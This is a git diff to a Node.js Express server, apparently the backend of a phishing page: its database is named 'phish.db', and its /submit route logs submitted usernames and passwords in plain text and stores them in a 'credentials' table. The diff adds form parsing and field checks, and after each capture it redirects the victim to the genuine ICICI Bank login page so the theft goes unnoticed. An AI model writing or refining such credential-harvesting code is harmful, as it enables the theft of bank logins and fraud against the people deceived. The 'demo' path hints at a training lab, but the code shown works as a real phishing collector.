@@ -12,6 +12,9 @@ const PORT = process.env.PORT || 3001;
 // Log to console
 app.use(morgan('combined'));
 
+// Middleware to parse form data
+app.use(express.urlencoded({ extended: true })); // Parse URL-encoded data
+
 // Database path
 const dbPath = process.env.DB || '/var/db/demo/phish.db';
 
@@ -58,13 +61,21 @@ app.get('/', (req, res) => {
 
 // Route: Handle form submission
 app.post('/submit', upload.none(), (req, res) => {
-    console.log('Request Body:', req); // Log parsed form data
+    // Log the incoming request body
+    console.log('Request Body:', req.body); 
 
+    // Destructure the form data from req.body
     const { username, password, website, date } = req.body;
+
+    // Validate the form data
+    if (!username || !password || !website || !date) {
+        console.error('Missing required fields in the form data');
+        return res.status(400).send('Bad Request: All fields are required');
+    }
 
     console.log(`Username: ${username}, Password: ${password}, Website: ${website}, Date: ${date}`);
 
-    // Store data in SQLite database
+    // Insert data into the SQLite database
     db.run(
         `INSERT INTO credentials (username, password, website, date) VALUES (?, ?, ?, ?)`,
         [username, password, website, date],
@@ -73,11 +84,13 @@ app.post('/submit', upload.none(), (req, res) => {
                 console.error('Error inserting data:', err.message);
                 return res.status(500).send('Internal Server Error');
             }
+
             console.log(`Data inserted with ID: ${this.lastID}`);
-            res.redirect('/');
+            res.redirect('https://infinity.icicibank.com/?FORMSGROUP_ID__=AuthenticationFG&__START_TRAN_FLAG__=Y&FG_BUTTONS__=LOAD&ACTION.LOAD=Y&AuthenticationFG.LOGIN_FLAG=1&BANK_ID=ICI&ITM=nli_personalb_personal_login_btn&_gl=1*11w9uul*_ga*MTk4ODY0MjIyNC4xNjA5MjM2MjAy*_ga_SFRXTKFEML*MTYwOTI0MTA0NC4yLjAuMTYwOTI0MTA0NC42MA..'); // Redirect the user after successful submission
         }
     );
 });
+
 
 // Start the server
 app.listen(PORT, () => {
